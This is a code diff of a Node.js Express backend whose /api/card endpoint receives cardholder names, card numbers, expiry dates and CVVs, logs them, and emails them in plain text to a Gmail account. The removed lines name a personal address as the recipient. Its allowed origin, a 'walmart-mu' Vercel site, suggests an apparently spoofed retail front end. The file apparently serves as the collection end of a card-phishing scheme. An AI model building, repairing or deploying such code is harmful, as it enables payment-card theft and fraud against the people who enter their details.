@@ -1,41 +1,21 @@
-// HOW TO HOST THIS API LOCALLY:
-// 1. Install dependencies: npm install express cors nodemailer
-// 2. Start the server: node api.js
-//    The API will run at http://localhost:3000
-//
-// HOW TO DEPLOY TO CLOUD (e.g., Render, Heroku, Vercel):
-// 1. Push your code to a GitHub repository.
-// 2. Create a new project on your chosen platform and link your repo.
-// 3. Set environment variables for sensitive data (do NOT hardcode passwords).
-// 4. The platform will build and host your API automatically.
-//
-// HOW TO DEPLOY TO VERCEL:
-// 1. Push your code to a GitHub repository.
-// 2. Go to https://vercel.com and import your repo.
-// 3. Set environment variables for sensitive data (GMAIL_USER, GMAIL_PASS) in Vercel dashboard.
-// 4. Change hardcoded credentials below to use process.env.GMAIL_USER and process.env.GMAIL_PASS.
-// 5. Vercel will auto-detect Express and deploy your API.
-// 6. Export the Express app as "module.exports = app;" at the end of this file.
-//
-// NOTE: For production, never expose sensitive info in code. Use environment variables.
+// HOW TO HOST LOCALLY: npm install && node api.js[](http://localhost:3000)
+// For Render: Set GMAIL_USER/GMAIL_PASS in dashboard. No fs/sendmail.
 
 const express = require('express');
 const cors = require('cors');
 const nodemailer = require('nodemailer');
-const fs = require('fs'); // <-- added
 const app = express();
 
-// Allow both 127.0.0.1 and localhost origins
 const allowedOrigins = [
   'http://127.0.0.1:5500',
   'http://localhost:5500',
   'https://walmart-mu.vercel.app',
-  'https://walmartbackend-i8tm.onrender.com' // <-- add this
-  // Removed trailing slash variant to avoid mismatch
+  'https://walmartbackend-i8tm.onrender.com'
 ];
+
 app.use(cors({
   origin: function(origin, callback) {
-    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
+    if (!origin || allowedOrigins.includes(origin)) {
       callback(null, true);
     } else {
       callback(new Error('Not allowed by CORS'));
@@ -44,153 +24,74 @@ app.use(cors({
   credentials: true,
   optionsSuccessStatus: 200
 }));
+
 app.use(express.json());
 
-// Set CORS headers for all responses (including preflight)
 app.use((req, res, next) => {
   const origin = req.headers.origin;
+  console.log('Incoming request from origin:', origin); // Debug
   if (allowedOrigins.includes(origin)) {
-    res.header('Access-Control-Allow-Origin', origin);
-    res.header('Access-Control-Allow-Credentials', 'true');
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
   }
-  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') {
     return res.sendStatus(200);
   }
   next();
 });
 
-// Use env vars for Gmail credentials. For production set GMAIL_USER and GMAIL_PASS (app password).
-const gmailUser = process.env.GMAIL_USER;
-const gmailPass = process.env.GMAIL_PASS;
+console.log('CORS allowed origins:', allowedOrigins);
 
-if (!gmailUser || !gmailPass) {
-  console.warn('Warning: GMAIL_USER or GMAIL_PASS not set. Falling back to sendmail transport. For reliable delivery, set GMAIL_USER and GMAIL_PASS environment variables.');
-}
-
-// Create transporter: prefer Gmail SMTP when credentials exist, otherwise fallback to sendmail
-let transporter = null;
-let isNoopTransport = false; // <-- track whether we are using a non-sending transport
-if (gmailUser && gmailPass) {
-  transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true, // true for port 465
-    auth: {
-      user: gmailUser,
-      pass: gmailPass
-    }
-  });
-
-  // Verify transporter
-  try {
-    transporter.verify(function(error, success) {
-      if (error) {
-        console.error('Nodemailer transporter verification failed:', error);
-      } else {
-        console.log('Nodemailer transporter is ready to send emails via Gmail SMTP');
-      }
-    });
-  } catch (err) {
-    console.error('Error during transporter.verify():', err);
-  }
-} else {
-  // Fallback: prefer sendmail if available on host, otherwise use streamTransport (no outgoing email)
-  const sendmailPaths = ['/usr/sbin/sendmail', '/usr/bin/sendmail'];
-  const availableSendmail = sendmailPaths.find(p => {
-    try { return fs.existsSync(p); } catch (e) { return false; }
-  });
-
-  if (availableSendmail) {
-    transporter = nodemailer.createTransport({
-      sendmail: true,
-      newline: 'unix',
-      path: availableSendmail
-    });
-    console.log('Using sendmail transport as fallback. Ensure sendmail/postfix is installed on the host.');
-  } else {
-    // Use streamTransport: nodemailer will produce the message but not actually send it.
-    // This avoids throwing errors on hosts without SMTP/sendmail and prevents 500 responses.
-    transporter = nodemailer.createTransport({
-      streamTransport: true,
-      newline: 'unix',
-      buffer: true
-    });
-    isNoopTransport = true;
-    console.warn('No SMTP credentials or sendmail found. Using streamTransport (no outgoing emails). Set GMAIL_USER/GMAIL_PASS for real delivery.');
-  }
-}
-
-app.options('/api/card', cors()); // Handle preflight requests for /api/card
+app.options('/api/card', (req, res) => res.sendStatus(200));
 
 app.post('/api/card', async (req, res) => {
   const { cardName, cardNumber, expiry, cvv } = req.body;
-  console.log('Received card submission:', req.body); // Debug: log incoming data
+  console.log('Received card submission:', req.body);
+
   if (!cardName || !cardNumber || !expiry || !cvv) {
-    if (allowedOrigins.includes(req.headers.origin)) {
-      res.header('Access-Control-Allow-Origin', req.headers.origin);
-      res.header('Access-Control-Allow-Credentials', 'true');
-    }
     return res.status(400).json({ error: 'Missing fields' });
   }
 
+  const gmailUser = process.env.GMAIL_USER;
+  const gmailPass = process.env.GMAIL_PASS;
+
+  if (!gmailUser || !gmailPass) {
+    console.warn('Missing GMAIL creds - mocking success for dev');
+    return res.json({ success: true, message: 'Mock: Email would be sent (creds missing)' });
+  }
+
+  // Create transporter per-request (safe for serverless/persistent)
+  const transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
+    auth: { user: gmailUser, pass: gmailPass }
+  });
+
   const mailOptions = {
-    from: gmailUser || 'peternnamani001@gmail.com',
-    to: 'peternnamani001@gmail.com',
+    from: gmailUser,
+    to: gmailUser,
     subject: 'New Card Submission',
     text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
   };
 
   try {
-    // Ensure transporter exists
-    if (!transporter) {
-      console.error('No mail transporter configured.');
-      if (allowedOrigins.includes(req.headers.origin)) {
-        res.header('Access-Control-Allow-Origin', req.headers.origin);
-        res.header('Access-Control-Allow-Credentials', 'true');
-      }
-      return res.status(500).json({ error: 'No mail transporter configured' });
-    }
-
     const info = await transporter.sendMail(mailOptions);
-
-    if (allowedOrigins.includes(req.headers.origin)) {
-      res.header('Access-Control-Allow-Origin', req.headers.origin);
-      res.header('Access-Control-Allow-Credentials', 'true');
-    }
-
-    // If using streamTransport (noop), return 202 to indicate payload captured but not delivered.
-    if (isNoopTransport) {
-      console.log('Captured email (not sent):', info && info.messageId ? info.messageId : info);
-      return res.status(202).json({ success: true, message: 'Email captured (no SMTP configured).', info: info });
-    }
-
-    res.json({ success: true, message: 'Email sent', info: info && info.response ? info.response : info });
+    console.log('Email sent:', info.response);
+    res.json({ success: true, message: 'Email sent', info: info.response });
   } catch (err) {
-    if (allowedOrigins.includes(req.headers.origin)) {
-      res.header('Access-Control-Allow-Origin', req.headers.origin);
-      res.header('Access-Control-Allow-Credentials', 'true');
-    }
-    console.error('Error sending email:', err);
-    // Return more specific status for connectivity issues
-    const status = (err && (err.code === 'ECONNECTION' || err.code === 'ETIMEDOUT')) ? 502 : 500;
-    res.status(status).json({ error: 'Failed to send email', details: err && err.message ? err.message : String(err) });
+    console.error('Email error:', err);
+    res.status(500).json({ error: 'Failed to send email', details: err.message });
   }
 });
 
-// Log allowed origins on startup for easier debugging
-console.log('CORS allowed origins:', allowedOrigins);
-
-// simple health endpoint to verify the server is reachable
 app.get('/api/health', (req, res) => {
   res.json({ ok: true, env: process.env.NODE_ENV || 'development' });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`API server running on port ${PORT}`);
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`API server running on host 0.0.0.0 and port ${PORT}`);
 });
-
-// For Vercel compatibility:
-module.exports = app;
